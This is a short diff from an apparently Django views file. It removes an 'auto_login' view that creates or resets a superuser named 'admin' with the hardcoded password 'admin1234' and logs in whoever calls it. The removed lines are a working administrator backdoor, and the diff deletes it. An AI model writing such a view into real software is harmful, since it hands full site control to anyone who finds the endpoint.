@@ -65,17 +65,6 @@ from django.contrib.auth.models import User
 from django.contrib.auth import login
 from django.shortcuts import redirect
 
-def auto_login(request):
-    user, created = User.objects.get_or_create(
-        username='admin', 
-        defaults={'is_staff': True, 'is_superuser': True, 'email': 'admin@admin.com'}
-    )
-
-    user.set_password('admin1234') 
-    user.save()
-    
-    login(request, user)
-    return redirect('/admin/')
 
 
 @csrf_exempt
